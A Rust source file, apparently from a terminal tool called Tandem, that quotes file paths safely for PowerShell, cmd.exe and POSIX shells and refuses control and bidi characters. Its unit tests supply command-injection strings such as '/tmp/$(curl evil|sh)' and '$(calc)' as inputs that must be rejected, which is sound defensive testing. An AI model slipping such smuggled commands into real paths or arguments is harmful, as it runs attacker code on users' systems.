//! Paths in program text: quoting a path for the shell that will read it and the one guard
//! every write of program-controlled text goes through (B5). The prompt path navigator
//! (Task 9) builds on these.

/// The refusal banner for text with a control character.
pub const REFUSED: &str = "Tandem did not write this text to the terminal: it holds a control character.";

/// `s` when it is safe to type into a terminal: no C0 control (CR, LF and ESC included), DEL,
/// C1 control, bidirectional formatting or zero-width character.
pub fn safe_text(s: &str) -> Option<&str> {
    // `is_hidden` is control (C0, DEL, C1), bidi formatting, line and paragraph separators and
    // zero-width characters: the one set every label drops.
    (!s.chars().any(crate::inert_files::is_hidden)).then_some(s)
}

/// Which shell reads a quoted path.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Shell {
    PowerShell,
    Cmd,
    Posix,
    /// No shell is named: nothing is quoted for a guess.
    Unknown,
}

/// The shell a reported name or path stands for (`/bin/zsh`, `C:\Windows\System32\cmd.exe`,
/// `pwsh`). Anything else, and no report at all, is `Unknown`: it is never read as cmd.exe.
pub fn shell_of(name: Option<&str>) -> Shell {
    let lower = name.unwrap_or_default().to_lowercase();
    let base = lower.rsplit(['\\', '/']).next().unwrap_or_default();
    let stem = base.trim_end_matches(".exe");
    if stem.contains("pwsh") || stem.contains("powershell") {
        Shell::PowerShell
    } else if matches!(stem, "bash" | "zsh" | "sh" | "fish" | "dash" | "ksh" | "tcsh" | "csh") {
        Shell::Posix
    } else if stem == "cmd" {
        Shell::Cmd
    } else {
        Shell::Unknown
    }
}

/// What a refusal for an unnamed shell says.
pub const UNKNOWN_REFUSED: &str = "Tandem did not write this path to the terminal: it holds a character some shells would read, and the shell is not known.";

/// A character special in some supported shell: with no shell named, a path holding one is not
/// quoted for a guess.
fn special_in_some_shell(c: char) -> bool {
    matches!(c, '$' | '`' | '\'' | '"' | '%' | '^' | '&' | '|' | '<' | '>' | ';' | '(' | ')' | '!' | '{' | '}' | '*' | '?' | '[' | ']' | '~' | '#' | '\u{2018}' | '\u{2019}' | '\u{201c}' | '\u{201d}')
}

/// What cmd.exe's refusal says.
pub const CMD_REFUSED: &str = "Tandem did not write this path to the terminal: cmd.exe would read a special character in it.";

/// The single-quote characters PowerShell reads as one (U+2018 to U+201B and the ASCII one).
fn powershell_quote(c: char) -> bool {
    matches!(c, '\'' | '\u{2018}'..='\u{201b}')
}

/// `path` quoted for `shell`, or Err with the banner when it cannot be quoted safely.
pub fn quote_for(path: &str, shell: Shell) -> Result<String, String> {
    let path = safe_text(path).ok_or_else(|| REFUSED.to_string())?;
    match shell {
        Shell::PowerShell => {
            let mut out = String::from("'");
            for c in path.chars() {
                out.push(c);
                if powershell_quote(c) {
                    out.push(c);
                }
            }
            out.push('\'');
            Ok(out)
        }
        // Double quotes do not stop %VAR% in cmd.exe, and a quote lookalike may close them in
        // a shell mistaken for it: such a path is not written.
        Shell::Cmd if path.chars().any(|c| matches!(c, '%' | '"' | '\u{201c}' | '\u{201d}' | '\u{ff02}')) => Err(CMD_REFUSED.to_string()),
        Shell::Cmd => Ok(format!("\"{path}\"")),
        // Double quotes hold a plain path in every shell; anything special in any of them is refused.
        Shell::Unknown if path.chars().any(special_in_some_shell) => Err(UNKNOWN_REFUSED.to_string()),
        Shell::Unknown => Ok(format!("\"{path}\"")),
        Shell::Posix => {
            let mut out = String::new();
            for c in path.chars() {
                if !(c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '/' | '-')) {
                    out.push('\\');
                }
                out.push(c);
            }
            Ok(out)
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn shells_are_named_by_shell_integration() {
        assert_eq!(shell_of(Some("pwsh")), Shell::PowerShell);
        assert_eq!(shell_of(Some("PowerShell")), Shell::PowerShell);
        assert_eq!(shell_of(Some("powershell.exe")), Shell::PowerShell);
        assert_eq!(shell_of(Some("bash")), Shell::Posix);
        assert_eq!(shell_of(Some("zsh")), Shell::Posix);
        assert_eq!(shell_of(Some("fish")), Shell::Posix);
        assert_eq!(shell_of(Some("cmd")), Shell::Cmd);
    }


    #[test]
    fn an_unnamed_shell_is_not_guessed() {
        assert_eq!(shell_of(None), Shell::Unknown);
        assert_eq!(shell_of(Some("weird")), Shell::Unknown);
        assert_eq!(shell_of(Some("/bin/zsh")), Shell::Posix);
        assert_eq!(shell_of(Some("C:\\Windows\\System32\\cmd.exe")), Shell::Cmd);
        assert_eq!(shell_of(Some("cmd")), Shell::Cmd);
        for bad in ["C:\\x$(calc)", "C:\\x`calc`", "C:\\a\u{2019}b", "C:\\a\u{201c}b", "/tmp/$(curl evil|sh)", "C:\\a;b", "C:\\a&b", "C:\\100%", "C:\\a!b", "C:\\a'b", "C:\\a~b", "C:\\a#b", "a{b", "a*b", "a?b", "a[b", "a(b)", "a^b", "a<b", "a>b", "a|b"] {
            assert!(quote_for(bad, Shell::Unknown).is_err(), "{bad}");
        }
        assert_eq!(quote_for(r"C:\a b", Shell::Unknown).unwrap(), "\"C:\\a b\"");
        assert_eq!(quote_for(r"C:\a b", Shell::Cmd).unwrap(), "\"C:\\a b\"");
    }

    #[test]
    fn quote_for_follows_the_shell() {
        let dir = "C:\\a'b\u{2018}\u{2019}\u{201a}\u{201b}; calc";
        assert_eq!(quote_for(dir, Shell::PowerShell).unwrap(), "'C:\\a''b\u{2018}\u{2018}\u{2019}\u{2019}\u{201a}\u{201a}\u{201b}\u{201b}; calc'");
        assert_eq!(quote_for(r"C:\a b", Shell::PowerShell).unwrap(), "'C:\\a b'");
        assert_eq!(quote_for(r"C:\a b", Shell::Cmd).unwrap(), "\"C:\\a b\"");
        assert_eq!(quote_for("/home/a b/it's$x\u{e9}", Shell::Posix).unwrap(), "/home/a\\ b/it\\'s\\$x\\\u{e9}");
        assert_eq!(quote_for("/plain/dir-1_x.y", Shell::Posix).unwrap(), "/plain/dir-1_x.y");
    }

    #[test]
    fn quote_for_refuses_what_a_shell_would_still_read() {
        for bad in ["C:\\100%", "C:\\a\"b", "C:\\a\u{201c}b", "C:\\a\u{ff02}b"] {
            assert!(quote_for(bad, Shell::Cmd).is_err(), "{bad}");
        }
        for shell in [Shell::PowerShell, Shell::Cmd, Shell::Posix] {
            assert_eq!(quote_for("a\r b", shell), Err(REFUSED.to_string()));
            assert_eq!(quote_for("a\nb", shell), Err(REFUSED.to_string()));
            assert_eq!(quote_for("a\u{1b}b", shell), Err(REFUSED.to_string()));
            assert_eq!(quote_for("a\u{202e}b", shell), Err(REFUSED.to_string()));
        }
    }

    #[test]
    fn safe_text_refuses_controls_and_bidi() {
        assert_eq!(safe_text("C:\\Program Files\\x \u{e9}\u{4e2d}"), Some("C:\\Program Files\\x \u{e9}\u{4e2d}"));
        for bad in ["\r", "\n", "\u{1b}", "\u{0}", "\u{7f}", "\u{9b}", "\u{202e}", "\u{2066}", "\u{200b}", "\u{feff}", "\u{2028}"] {
            assert_eq!(safe_text(&format!("a{bad}b")), None, "{bad:?}");
        }
    }
}
